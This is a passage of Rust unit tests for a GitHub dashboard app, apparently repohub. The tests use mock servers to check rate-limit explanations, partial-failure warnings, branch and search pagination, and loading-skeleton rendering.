        let mut next = model::Data::sample_at(1_700_000_000);
        next.sample = false;
        let epoch = s.load_gen;
        s.apply(epoch, Ok(next));

        assert!(s.details.contains_key(&(unpushed, "main".into())), "clean detail on unpushed repo is kept");
        assert!(!s.details.contains_key(&(errored, "main".into())), "detail with error is not kept");
        assert!(!s.details.contains_key(&(readme_errored, "main".into())), "detail with readme_error is not kept");
        assert!(!s.details.contains_key(&("user/load-failed".into(), "main".into())), "Load::Failed is not kept");

        // 4. load_detail retries Load::Failed and errored entries, skipping only Loading and clean Ready
        s.details.insert(("user/clean".into(), "main".into()), Load::Ready(Detail::default()));
        s.details.insert(("user/err".into(), "main".into()), Load::Ready(Detail { error: Some("err".into()), ..Detail::default() }));
        s.details.insert(("user/readme-err".into(), "main".into()), Load::Ready(Detail { readme_error: Some("err".into()), ..Detail::default() }));
        s.details.insert(("user/failed".into(), "main".into()), Load::Failed("err".into()));
        s.details.insert(("user/loading".into(), "main".into()), Load::Loading);

        // repo index 0 in s.data has full_name matching repo 0
        let r0 = s.data.repos[0].full_name.clone();
        let key0 = (r0.clone(), s.branch(0));

        // When clean: load_detail skips without resetting to Loading
        s.details.insert(key0.clone(), Load::Ready(Detail::default()));
        s.load_detail(0);
        assert!(matches!(s.details.get(&key0), Some(Load::Ready(_))));

        // When errored: load_detail retries, moving entry to Loading
        s.details.insert(key0.clone(), Load::Ready(Detail { error: Some("failed".into()), ..Detail::default() }));
        s.load_detail(0);
        assert!(matches!(s.details.get(&key0), Some(Load::Loading)));

        // When Load::Failed: load_detail retries, moving entry to Loading
        s.details.insert(key0.clone(), Load::Failed("failed".into()));
        s.load_detail(0);
        assert!(matches!(s.details.get(&key0), Some(Load::Loading)));

        // When Load::Failed, repo page renders retry buttons and does NOT claim "This repository has no README."
        s.details.insert(key0.clone(), Load::Failed("Could not connect to GitHub".into()));
        s.page = Page::Repo(r0.clone());
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        assert!(rt.find("retry-files").is_some(), "retry-files button must be present on Load::Failed");
        assert!(rt.find("readme-retry").is_some(), "readme-retry button must be present on Load::Failed");
        assert!(rt.elements().iter().all(|e| e.text.as_deref() != Some("This repository has no README.")), "must NOT claim no README on Load::Failed");
        assert!(rt.elements().iter().any(|e| e.text.as_deref() == Some("Could not connect to GitHub")), "must display the error message");
    }

    #[test]
    fn secondary_rate_limit_and_retry_after() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = "http://127.0.0.1:9".into();
        let gh = crate::github::Gh::new(&cfg);

        // 1. 403 with "You have exceeded a secondary rate limit" and remaining 4999
        let resp_403 = Resp {
            status: 403,
            body: r#"{"message": "You have exceeded a secondary rate limit. Please wait a few minutes before you try again."}"#.into(),
            remaining: Some("4999".into()),
            reset: None,
            retry_after: None,
            link: None,
        };
        let msg_403 = gh.explain(&resp_403);
        assert!(msg_403.contains("rate limit"), "must explain rate limit: {msg_403}");
        assert!(!msg_403.contains("write access"), "must NOT claim write access: {msg_403}");

        // 2. 429 with retry-after: 40
        let resp_429 = Resp {
            status: 429,
            body: r#"{"message": "rate limited"}"#.into(),
            remaining: None,
            reset: None,
            retry_after: Some(40),
            link: None,
        };
        let msg_429 = gh.explain(&resp_429);
        assert!(msg_429.contains("40 s") || msg_429.contains("40"), "must mention retry duration: {msg_429}");
        assert!(!msg_429.contains("write access"), "must NOT claim write access: {msg_429}");
        assert_eq!(gh.retry_after(), Some(40), "Gh must record the 40s backoff");

        // 3. Regular 403 write permission failure still says write access
        let resp_generic_403 = Resp {
            status: 403,
            body: r#"{"message": "Resource not accessible by integration"}"#.into(),
            remaining: Some("4999".into()),
            reset: None,
            retry_after: None,
            link: None,
        };
        let msg_generic_403 = gh.explain(&resp_generic_403);
        assert!(msg_generic_403.contains("The token needs write access"), "generic 403 must explain write access: {msg_generic_403}");

        // 4. Primary rate limit (status 403, remaining 0, no retry-after):
        let resp_primary_403 = Resp {
            status: 403,
            body: r#"{"message": "API rate limit exceeded for user"}"#.into(),
            remaining: Some("0".into()),
            reset: Some(crate::net::now() + 600),
            retry_after: None,
            link: None,
        };
        let msg_primary_403 = gh.explain(&resp_primary_403);
        assert!(msg_primary_403.contains("API rate limit reached."), "must start with API rate limit reached.: {msg_primary_403}");
        assert!(msg_primary_403.contains("With GITHUB_TOKEN the limit goes up to 5,000 requests an hour."), "must mention GITHUB_TOKEN: {msg_primary_403}");
        assert_eq!(gh.retry_after(), Some(600), "must record reset backoff");

        // 5. Mock HTTP server returning 429 with retry-after: 40
        let server = MockServer::new(|_method, _path| {
            (429, vec![("Content-Type", "application/json"), ("retry-after", "40")], r#"{"message":"rate limited"}"#.into())
        });
        cfg.api = server.url();
        cfg.token = Some("tok".into());
        let gh_live = crate::github::Gh::new(&cfg);
        let err = pollster::block_on(gh_live.profile(&cfg)).unwrap_err();
        assert!(err.contains("40 s") || err.contains("40"));
        assert_eq!(gh_live.retry_after(), Some(40));

        // 6. App::refresh_in honours retry_after
        let mut app = crate::init();
        let mut app_cfg = (*app.cfg).clone();
        app_cfg.token = Some("tok".into());
        app_cfg.refresh_minutes = 5; // 5 minutes = 300 seconds
        app.cfg = std::sync::Arc::new(app_cfg);
        app.status = Status::Ready;
        app.now = 1_700_000_100;
        app.last_load = Some(1_700_000_000); // 100 seconds elapsed
        app.load_clock = Some(0.0);
        app.clock = 100.0;

        // Normal refresh: 300 - 100 = 200s left
        assert_eq!(app.refresh_in(), Some(200));

        // Rate limit backoff: retry_after of 500s > 300s -> 500 - 100 = 400s left
        app.retry_after = Some(500);
        assert_eq!(app.refresh_in(), Some(400));

        // When refresh is initiated, retry_after is cleared
        app.refresh();
        assert_eq!(app.retry_after, None);
    }

    #[test]
    fn partial_failure_warnings_banner_and_tray_menu() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let server = MockServer::new(|_method, path| {
            if path.contains("/search/issues") {
                (403, vec![("Content-Type", "application/json")], r#"{"message":"You have exceeded a secondary rate limit"}"#.into())
            } else if path.contains("/actions/runs") {
                (500, vec![("Content-Type", "application/json")], r#"{"message":"Internal Server Error"}"#.into())
            } else if path.contains("/stats/participation") {
                (202, vec![("Content-Type", "application/json")], "null".into())
            } else if path.contains("/user/starred") {
                (403, vec![("Content-Type", "application/json")], r#"{"message":"rate limit"}"#.into())
            } else if path.contains("/user/repos") {
                (200, vec![("Content-Type", "application/json")], r#"[{"name":"repo1","full_name":"alice/repo1","owner":{"login":"alice"},"description":"","language":"Rust","stargazers_count":10,"forks_count":1,"open_issues_count":2,"pushed_at":"2026-11-09T09:35:11Z","private":false,"fork":false,"archived":false,"default_branch":"main","topics":[],"html_url":"https://github.com/alice/repo1"}]"#.into())
            } else if path.contains("/user") {
                (200, vec![("Content-Type", "application/json")], r#"{"login":"alice","name":"Alice"}"#.into())
            } else {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            }
        });

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = server.url();
        cfg.token = Some("tok_alice".into());
        cfg.activity_repos = 1;

        let res = pollster::block_on(crate::github::load_all(&cfg));
        let data = res.expect("load_all succeeds partially despite search and runs failure");

        // Verify partial failure tracking in Data
        assert!(data.pulls_failed, "pulls_failed must be true");
        assert!(data.issues_failed, "issues_failed must be true");
        assert!(data.runs_failed, "runs_failed must be true");
        assert!(!data.warnings.is_empty(), "warnings must be populated");
        assert!(data.warnings.iter().any(|w| w.contains("Pull requests couldn't load")));
        assert!(data.warnings.iter().any(|w| w.contains("Issues couldn't load")));
        assert!(data.warnings.iter().any(|w| w.contains("Workflow runs couldn't load")));
        assert!(data.warnings.iter().any(|w| w.contains("Starred repositories couldn't load")));

        // Verify tray menu with failure flags and empty lists
        let mut app = crate::init();
        app.data = data.clone();
        let menu = crate::tray::menu(&app);

        let pulls_item = menu.iter().find(|e| e.id == "go:pulls").expect("go:pulls found");
        assert_eq!(pulls_item.label, "Pull requests couldn't load");

        let issues_item = menu.iter().find(|e| e.id == "go:issues").expect("go:issues found");
        assert_eq!(issues_item.label, "Issues couldn't load");

        let runs_item = menu.iter().find(|e| e.id == "go:actions").expect("go:actions found");
        assert_eq!(runs_item.label, "Workflow runs couldn't load", "must NOT claim 'Recent runs passed'");

        // When runs is not empty with passing run, but runs_failed is true, label must still be "Workflow runs couldn't load"
        app.data.runs = vec![crate::model::Run {
            workflow: "CI".into(),
            repo: "alice/repo1".into(),
            branch: "main".into(),
            checks: crate::model::Checks::Passing,
            duration: "1m".into(),
            updated_at: 1_700_000_000,
            url: String::new(),
        }];
        app.data.runs_failed = true;
        let menu = crate::tray::menu(&app);
        let runs_item = menu.iter().find(|e| e.id == "go:actions").expect("go:actions found");
        assert_eq!(runs_item.label, "Workflow runs couldn't load", "must NOT claim 'Recent runs passed' on partial failure even if some runs passed");

        // When runs_failed is false and runs passed, label is "Recent runs passed"
        app.data.runs_failed = false;
        let menu = crate::tray::menu(&app);
        let runs_item = menu.iter().find(|e| e.id == "go:actions").expect("go:actions found");
        assert_eq!(runs_item.label, "Recent runs passed");

        // Verify banner rendering when Ready with warnings
        app.status = Status::Ready;
        let kit = themes::kit(themes::Looks::default().active(false));
        let banner_el = banner(&app, &kit);
        assert!(banner_el.is_some(), "banner must be visible when Ready with warnings");
    }

    #[test]
    fn branches_cleared_on_refresh_retried_and_deleted_fallback() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let mut s = crate::init();
        let mut s_cfg = (*s.cfg).clone();
        s_cfg.token = Some("tok".into());
        s.cfg = std::sync::Arc::new(s_cfg);
        s.now = 1_700_000_000;
        s.data = model::Data::sample_at(s.now);
        s.data.sample = false;
        let repo_full = s.data.repos[0].full_name.clone();

        // 1. Branches are cleared on refresh
        s.branches.insert(repo_full.clone(), Load::Ready(vec!["main".into(), "feature".into()]));
        assert!(!s.branches.is_empty());
        let epoch = s.load_gen;
        s.apply(epoch, Ok(s.data.clone()));
        assert!(s.branches.is_empty(), "branches must be cleared on apply(refresh)");

        // 2. Retrying Load::Failed in load_branches
        s.branches.insert(repo_full.clone(), Load::Failed("network timeout".into()));
        // calling load_branches(0, false) must NOT return early on Load::Failed
        s.load_branches(0, false);
        // Without handle, in live mode, branches is set to Loading
        assert!(matches!(s.branches.get(&repo_full), Some(Load::Loading)), "Load::Failed must be retried");

        // 3. App::open calls load_branches with force=true
        s.branches.insert(repo_full.clone(), Load::Ready(vec!["main".into()]));
        s.open(0);
        // Calling open(0) forces refresh of branches
        assert!(s.page == Page::Repo(repo_full.clone()));

        // 4. Deleted branch fallback: if branch_of points to a branch no longer in names
        s.page = Page::Repo(repo_full.clone());
        s.branch_of.insert(repo_full.clone(), "deleted-branch".into());
        assert_eq!(s.branch(0), "deleted-branch");

        s.apply_branches(s.load_gen, repo_full.clone(), Ok(vec!["main".into(), "feature-alive".into()]));

        // branch_of removed for that repo, falling back to default branch ("main")
        assert!(!s.branch_of.contains_key(&repo_full), "deleted branch must be removed from branch_of");
        assert_eq!(s.branch(0), "main", "must fall back to default branch");
    }

    #[test]
    fn paged_branches_stars_and_sorted_runs() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let server = MockServer::new(|_method, path| {
            if path.contains("/repos/alice/repo1/branches?per_page=100") && !path.contains("page=2") {
                let branches: Vec<serde_json::Value> = (1..=100)
                    .map(|i| serde_json::json!({ "name": format!("feature-{i:03}") }))
                    .collect();
                (200, vec![
                    ("Content-Type", "application/json"),
                    ("Link", r#"<https://api.github.com/repos/alice/repo1/branches?per_page=100&page=2>; rel="next""#),
                ], serde_json::to_string(&branches).unwrap())
            } else if path.contains("/repos/alice/repo1/branches?per_page=100&page=2") {
                let branches = serde_json::json!([
                    { "name": "main" },
                    { "name": "feature-101" }
                ]);
                (200, vec![("Content-Type", "application/json")], branches.to_string())
            } else if path.contains("/user/starred?per_page=100") && !path.contains("page=2") {
                let starred: Vec<serde_json::Value> = (1..=100)
                    .map(|i| serde_json::json!({ "full_name": format!("owner/repo-{i:03}") }))
                    .collect();
                (200, vec![
                    ("Content-Type", "application/json"),
                    ("Link", r#"<https://api.github.com/user/starred?per_page=100&page=2>; rel="next""#),
                ], serde_json::to_string(&starred).unwrap())
            } else if path.contains("/user/starred?per_page=100&page=2") {
                let starred = serde_json::json!([
                    { "full_name": "owner/repo-101" },
                    { "full_name": "alice/repo1" }
                ]);
                (200, vec![("Content-Type", "application/json")], starred.to_string())
            } else if path.contains("/repos/alice/repo1/actions/runs") {
                let runs = serde_json::json!({
                    "workflow_runs": [
                        { "name": "CI", "head_branch": "main", "status": "completed", "conclusion": "success", "run_started_at": "2026-11-09T08:00:00Z", "updated_at": "2026-11-09T08:30:00Z", "html_url": "https://github.com/alice/repo1/actions/runs/1" }
                    ]
                });
                (200, vec![("Content-Type", "application/json")], runs.to_string())
            } else if path.contains("/repos/alice/repo2/actions/runs") {
                let runs = serde_json::json!({
                    "workflow_runs": [
                        { "name": "Release", "head_branch": "main", "status": "completed", "conclusion": "success", "run_started_at": "2026-11-09T09:00:00Z", "updated_at": "2026-11-09T09:30:00Z", "html_url": "https://github.com/alice/repo2/actions/runs/2" }
                    ]
                });
                (200, vec![("Content-Type", "application/json")], runs.to_string())
            } else if path.contains("/stats/participation") {
                (200, vec![("Content-Type", "application/json")], "null".into())
            } else if path.contains("/user/repos") {
                let repos = serde_json::json!([
                    { "name": "repo1", "full_name": "alice/repo1", "owner": { "login": "alice" }, "description": "", "language": "Rust", "stargazers_count": 10, "forks_count": 1, "open_issues_count": 2, "pushed_at": "2026-11-09T09:35:11Z", "private": false, "fork": false, "archived": false, "default_branch": "main", "topics": [], "html_url": "https://github.com/alice/repo1" },
                    { "name": "repo2", "full_name": "alice/repo2", "owner": { "login": "alice" }, "description": "", "language": "Rust", "stargazers_count": 5, "forks_count": 0, "open_issues_count": 0, "pushed_at": "2026-11-09T09:30:00Z", "private": false, "fork": false, "archived": false, "default_branch": "main", "topics": [], "html_url": "https://github.com/alice/repo2" }
                ]);
                (200, vec![("Content-Type", "application/json")], repos.to_string())
            } else if path.contains("/search/issues") && path.contains("is%3Aopen") && path.contains("is%3Apr") {
                let pulls = serde_json::json!({
                    "total_count": 132,
                    "items": [
                        { "number": 1, "title": "Add feature", "repository_url": "https://api.github.com/repos/alice/repo1", "user": { "login": "alice" }, "state": "open", "draft": false, "updated_at": "2026-11-09T10:00:00Z", "comments": 2, "html_url": "https://github.com/alice/repo1/pull/1" }
                    ]
                });
                (200, vec![("Content-Type", "application/json")], pulls.to_string())
            } else if path.contains("/search/issues") && path.contains("is%3Aclosed") && path.contains("is%3Apr") {
                let pulls = serde_json::json!({
                    "total_count": 200,
                    "items": [
                        { "number": 50, "title": "Old PR", "repository_url": "https://api.github.com/repos/alice/repo1", "user": { "login": "alice" }, "state": "closed", "draft": false, "updated_at": "2026-11-08T10:00:00Z", "comments": 1, "html_url": "https://github.com/alice/repo1/pull/50" }
                    ]
                });
                (200, vec![("Content-Type", "application/json")], pulls.to_string())
            } else if path.contains("/search/issues") && path.contains("is%3Aissue") {
                let issues = serde_json::json!({
                    "total_count": 75,
                    "items": [
                        { "number": 2, "title": "Bug report", "repository_url": "https://api.github.com/repos/alice/repo1", "created_at": "2026-11-09T10:00:00Z", "comments": 1, "html_url": "https://github.com/alice/repo1/issues/2" }
                    ]
                });
                (200, vec![("Content-Type", "application/json")], issues.to_string())
            } else if path.contains("/user") {
                (200, vec![("Content-Type", "application/json")], r#"{"login":"alice","name":"Alice"}"#.into())
            } else {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            }
        });

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = server.url();
        cfg.token = Some("tok_alice".into());
        cfg.activity_repos = 2;

        let gh = crate::github::Gh::new(&cfg);

        // 1. Branches paged beyond 100 with default branch sorted first
        let branch_list = pollster::block_on(gh.branches("alice/repo1", "main")).expect("branches load");
        assert_eq!(branch_list.len(), 102, "paged branches beyond 100 loaded");
        assert_eq!(branch_list[0], "main", "default branch must be first");
        assert!(branch_list.contains(&"feature-001".to_string()));
        assert!(branch_list.contains(&"feature-101".to_string()));

        // 2. Load all: paged stars (beyond 100), sorted runs across repos, totals populated
        let data = pollster::block_on(crate::github::load_all(&cfg)).expect("load_all succeeds");
        assert!(data.repos[0].starred, "alice/repo1 was on page 2 of starred and must be starred=true");
        assert_eq!(data.open_pulls_total, Some(132));
        assert_eq!(data.closed_pulls_total, Some(200));
        assert_eq!(data.pulls_total(), Some(332));
        assert_eq!(data.issues_total, Some(75));
        assert_eq!(data.runs.len(), 2);
        // Runs sorted by updated_at descending: repo2 (09:30) before repo1 (08:30)
        assert_eq!(data.runs[0].workflow, "Release");
        assert_eq!(data.runs[1].workflow, "CI");
        assert!(data.prs_capped());
        assert!(data.issues_capped());

        // Verify UI subtitles and metrics with capped/total counts
        let mut app = crate::init();
        app.data = data;
        app.status = Status::Ready;
        app.page = crate::Page::Pulls;

        let menu = crate::tray::menu(&app);
        let pulls_item = menu.iter().find(|e| e.id == "go:pulls").expect("go:pulls");
        assert_eq!(pulls_item.label, "1+ open pull requests");
        let issues_item = menu.iter().find(|e| e.id == "go:issues").expect("go:issues");
        assert_eq!(issues_item.label, "1+ open issues");

        let mut rt = rune::Runtime::new(app, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        assert!(rt.elements().iter().any(|e| e.text.as_deref().is_some_and(|t| t.contains("Showing 1 of 132 open pull requests"))), "PR subtitle shows 'Showing 1 of 132 open pull requests'");
        assert!(rt.elements().iter().any(|e| e.key.as_deref() == Some("pulls-load-more")), "Load more button exists on Pulls");

        rt.update(|s, _| s.page = crate::Page::Issues);
        rt.frame(0.0);
        assert!(rt.elements().iter().any(|e| e.text.as_deref().is_some_and(|t| t.contains("Showing 1 of 75"))), "Issues subtitle shows 'Showing 1 of 75'");
        assert!(rt.elements().iter().any(|e| e.key.as_deref() == Some("issues-load-more")), "Load more button exists on Issues");
    }

    #[test]
    fn prs_capped_no_zero_plus_regression() {
        // When there are 0 open PRs, but closed_pulls_total has 200, prs_capped() must be false!
        let data = Data {
            pulls: vec![
                model::Pull { labels: Vec::new(),
                    number: 1,
                    title: "Closed PR".into(),
                    repo: "alice/repo1".into(),
                    author: "alice".into(),
                    state: model::PullState::Closed,
                    checks: None,
                    updated_at: 1000,
                    comments: 0,
                    url: String::new(),
                }
            ],
            open_pulls_total: Some(0),
            closed_pulls_total: Some(200),
            ..Data::default()
        };
        assert!(!data.prs_capped(), "0 open PRs must NOT be capped even if closed_pulls_total is 200");
    }

    #[test]
    fn branches_default_branch_guaranteed_when_past_ten_pages() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let server = MockServer::new(|_method, path| {
            if path.contains("/branches") {
                let branches: Vec<serde_json::Value> = (1..=100)
                    .map(|i| serde_json::json!({ "name": format!("feature-{i:03}") }))
                    .collect();
                (200, vec![
                    ("Content-Type", "application/json"),
                    ("Link", r#"<https://api.github.com/repos/alice/huge/branches?per_page=100&page=2>; rel="next""#),
                ], serde_json::to_string(&branches).unwrap())
            } else {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            }
        });

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = server.url();
        cfg.token = Some("tok".into());

        let gh = crate::github::Gh::new(&cfg);
        let branches = pollster::block_on(gh.branches("alice/huge", "main")).expect("branches load");
        assert_eq!(branches[0], "main", "default branch 'main' must be index 0 even if omitted from first 10 pages");
    }

    #[test]
    fn issues_chunking_with_more_than_twenty_orgs() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let server = MockServer::new(|_method, path| {
            if path.contains("/search/issues") {
                if path.contains("user%3Aalice") {
                    let res = serde_json::json!({
                        "total_count": 10,
                        "items": [
                            { "number": 1, "title": "Chunk 1 issue", "repository_url": "https://api.github.com/repos/alice/repo1", "created_at": "2026-11-09T10:00:00Z", "comments": 0, "html_url": "https://github.com/alice/repo1/issues/1" }
                        ]
                    });
                    (200, vec![("Content-Type", "application/json")], res.to_string())
                } else {
                    let res = serde_json::json!({
                        "total_count": 5,
                        "items": [
                            { "number": 2, "title": "Chunk 2 issue", "repository_url": "https://api.github.com/repos/org25/repo2", "created_at": "2026-11-09T11:00:00Z", "comments": 0, "html_url": "https://github.com/org25/repo2/issues/2" }
                        ]
                    });
                    (200, vec![("Content-Type", "application/json")], res.to_string())
                }
            } else {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            }
        });

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = server.url();
        cfg.token = Some("tok".into());

        let gh = crate::github::Gh::new(&cfg);
        let orgs: Vec<String> = (1..=25).map(|i| format!("org{i}")).collect();
        let (issues, total) = pollster::block_on(gh.issues("alice", &orgs)).expect("issues load");
        assert_eq!(total, 15, "sum of chunk totals: 10 + 5 = 15");
        assert_eq!(issues.len(), 2, "both chunk issues merged");
        assert_eq!(issues[0].title, "Chunk 2 issue", "sorted newest first");
    }

    #[test]
    fn load_more_pulls_and_issues_pages() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let server = MockServer::new(|_method, path| {
            if path.contains("/search/issues") && path.contains("is%3Apr") && path.contains("page=2") {
                let pulls = serde_json::json!({
                    "total_count": 2,
                    "items": [
                        { "number": 1, "title": "Dupe PR", "repository_url": "https://api.github.com/repos/alice/repo1", "user": { "login": "alice" }, "state": "open", "draft": false, "updated_at": "2026-11-09T10:00:00Z", "comments": 2, "html_url": "https://github.com/alice/repo1/pull/1" },
                        { "number": 2, "title": "Page 2 PR", "repository_url": "https://api.github.com/repos/alice/repo1", "user": { "login": "alice" }, "state": "open", "draft": false, "updated_at": "2026-11-09T09:00:00Z", "comments": 0, "html_url": "https://github.com/alice/repo1/pull/2" }
                    ]
                });
                (200, vec![("Content-Type", "application/json")], pulls.to_string())
            } else if path.contains("/search/issues") && path.contains("is%3Aissue") && path.contains("page=2") {
                let issues = serde_json::json!({
                    "total_count": 2,
                    "items": [
                        { "number": 10, "title": "Page 2 Issue", "repository_url": "https://api.github.com/repos/alice/repo1", "created_at": "2026-11-09T12:00:00Z", "comments": 0, "html_url": "https://github.com/alice/repo1/issues/10" }
                    ]
                });
                (200, vec![("Content-Type", "application/json")], issues.to_string())
            } else {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            }
        });

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = server.url();
        cfg.token = Some("tok".into());

        let gh = crate::github::Gh::new(&cfg);

        // Load more pulls page 2 deduplicates against page 1
        let (pulls, total) = pollster::block_on(gh.pulls_page("alice", true, 2)).expect("pulls_page succeeds");
        assert_eq!(total, 2);
        assert_eq!(pulls.len(), 2);

        // Load more issues page 2
        let (issues, total) = pollster::block_on(gh.issues_page("alice", &[], 2)).expect("issues_page succeeds");
        assert_eq!(total, 2);
        assert_eq!(issues.len(), 1);
        assert_eq!(issues[0].title, "Page 2 Issue");
    }

    #[test]
    fn public_orgs_and_repos_pagination_caps() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let server = MockServer::new(|_method, path| {
            if path.contains("/users/alice/orgs") && !path.contains("page=2") {
                let orgs: Vec<serde_json::Value> = (1..=100)
                    .map(|i| serde_json::json!({ "login": format!("org{i:03}") }))
                    .collect();
                (200, vec![
                    ("Content-Type", "application/json"),
                    ("Link", r#"<https://api.github.com/users/alice/orgs?per_page=100&page=2>; rel="next""#),
                ], serde_json::to_string(&orgs).unwrap())
            } else if path.contains("/users/alice/orgs?per_page=100&page=2") {
                let orgs = serde_json::json!([
                    { "login": "org101" }
                ]);
                (200, vec![("Content-Type", "application/json")], orgs.to_string())
            } else if path.contains("/users/alice/repos") {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            } else if path.contains("/orgs/") && path.contains("/repos") {
                let repos = serde_json::json!([
                    { "name": "repo", "full_name": "org/repo", "owner": { "login": "org" }, "description": "", "language": "Rust", "stargazers_count": 0, "forks_count": 0, "open_issues_count": 0, "pushed_at": "2026-11-09T09:30:00Z", "private": false, "fork": false, "archived": false, "default_branch": "main", "topics": [], "html_url": "https://github.com/org/repo" }
                ]);
                (200, vec![("Content-Type", "application/json")], repos.to_string())
            } else {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            }
        });

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = server.url();
        cfg.token = None; // unauthenticated: calls public orgs flow
        cfg.max_repos = 500;

        let gh = crate::github::Gh::new(&cfg);
        let mut warnings = Vec::new();
        let (repos, repos_capped) = pollster::block_on(gh.repos(&cfg, "alice", false, &mut warnings)).expect("repos load");
        assert!(repos_capped, "101 orgs > 50 must set repos_capped = true");
        assert_eq!(repos.len(), 50, "only first 50 orgs queried");
    }
}

#[cfg(test)]
mod fix62_tests {
    use super::*;

    struct IsolatedEnv {
        prev_data_dir: Option<String>,
        dir: std::path::PathBuf,
    }

    impl IsolatedEnv {
        fn new(tag: &str) -> Self {
            let prev_data_dir = std::env::var("REPOHUB_DATA_DIR").ok();
            let dir = std::env::temp_dir().join(format!(
                "repohub-fix62-{tag}-{}-{}",
                std::process::id(),
                std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos()
            ));
            let _ = std::fs::create_dir_all(&dir);
            // SAFETY: callers hold crate::ENV_LOCK.
            unsafe { std::env::set_var("REPOHUB_DATA_DIR", &dir) };
            Self { prev_data_dir, dir }
        }
    }

    impl Drop for IsolatedEnv {
        fn drop(&mut self) {
            unsafe {
                match &self.prev_data_dir {
                    Some(v) => std::env::set_var("REPOHUB_DATA_DIR", v),
                    None => std::env::remove_var("REPOHUB_DATA_DIR"),
                }
            }
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }

    fn live_app() -> App {
        let mut s = crate::init();
        let mut cfg = (*s.cfg).clone();
        cfg.demo = false;
        cfg.user = Some("alice".into());
        cfg.token = None;
        cfg.api = "http://127.0.0.1:9".into();
        s.cfg = Arc::new(cfg);
        s.data = Data::default();
        s.pending_place = None;
        s.status = Status::Starting;
        s
    }

    fn sample_repo(full: &str) -> model::Repo {
        let (owner, name) = full.split_once('/').unwrap_or(("alice", full));
        model::Repo {
            name: name.into(),
            full_name: full.into(),
            owner: owner.into(),
            description: "Example repo".into(),
            language: "Rust".into(),
            hue: 40.0,
            stars: 3,
            forks: 1,
            issues: 0,
            pushed: 1_700_000_000,
            private: false,
            fork: false,
            archived: false,
            starred: false,
            branch: "main".into(),
            topics: vec![],
            url: format!("https://github.com/{full}"),
        }
    }

    fn has_text(rt: &rune::Runtime<App>, needle: &str) -> bool {
        rt.elements().iter().any(|e| e.text.as_deref() == Some(needle))
    }

    fn count_text(rt: &rune::Runtime<App>, needle: &str) -> usize {
        rt.elements().iter().filter(|e| e.text.as_deref() == Some(needle)).count()
    }

    fn contains_text(rt: &rune::Runtime<App>, needle: &str) -> bool {
        rt.elements().iter().any(|e| e.text.as_deref().is_some_and(|t| t.contains(needle)))
    }

    fn new_rt(app: App) -> rune::Runtime<App> {
        let mut rt = rune::Runtime::new(app, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.reduced_motion = true;
        rt
    }

    fn click(rt: &mut rune::Runtime<App>, key: &str) {
        let (x, y) = rt.find(key).unwrap_or_else(|| panic!("missing element key `{key}`"));
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(1.0);
    }

    fn label_of(rt: &rune::Runtime<App>, key: &str) -> Option<String> {
        rt.elements().iter().find(|e| e.key.as_deref() == Some(key)).and_then(|e| e.label.clone())
    }

    #[test]
    fn first_load_shows_skeletons_and_ready_empty_data_keeps_empty_messages() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _iso = IsolatedEnv::new("skeletons");

        let mut rt = new_rt(live_app());

        for status in [Status::Starting, Status::Loading] {
            rt.update(|s, _| {
                s.status = status.clone();
                s.page = Page::Overview;
            });
            rt.frame(1.0);
            assert!(rt.find("skeleton-activity").is_some(), "Overview shows activity skeleton in {status:?}");
            assert!(rt.find("skeleton-recent").is_some(), "Overview shows recent repos skeleton in {status:?}");
            assert!(rt.find("skeleton-pulls").is_some(), "Overview shows open PRs skeleton in {status:?}");
            assert_eq!(label_of(&rt, "metric-Repositories").as_deref(), Some("Loading Repositories"));
            assert_eq!(label_of(&rt, "metric-Stars received").as_deref(), Some("Loading Stars received"));
            assert_eq!(label_of(&rt, "metric-Open pull requests").as_deref(), Some("Loading Open pull requests"));
            assert_eq!(label_of(&rt, "metric-Open issues").as_deref(), Some("Loading Open issues"));
            assert!(!has_text(&rt, "0 commits"), "Overview hides 0 commits while loading ({status:?})");
            assert!(!has_text(&rt, "No repositories to show"));
            assert!(!has_text(&rt, "No open pull requests"));

            rt.update(|s, _| s.page = Page::Repos);
            rt.frame(1.0);
            assert!(rt.find("skeleton-repos").is_some(), "Repos shows skeleton list in {status:?}");
            assert!(rt.find("skeleton-card-0").is_some(), "Repos shows skeleton cards in {status:?}");
            assert!(!has_text(&rt, "No repositories to show"));
            assert!(!has_text(&rt, "0 of 0 repositories"));

            rt.update(|s, _| s.page = Page::Pulls);
            rt.frame(1.0);
            assert!(rt.find("skeleton-list").is_some(), "Pulls shows skeleton rows in {status:?}");
            assert!(!has_text(&rt, "No pull requests in this state"));

            rt.update(|s, _| s.page = Page::Issues);
            rt.frame(1.0);
            assert!(rt.find("skeleton-list").is_some(), "Issues shows skeleton rows in {status:?}");
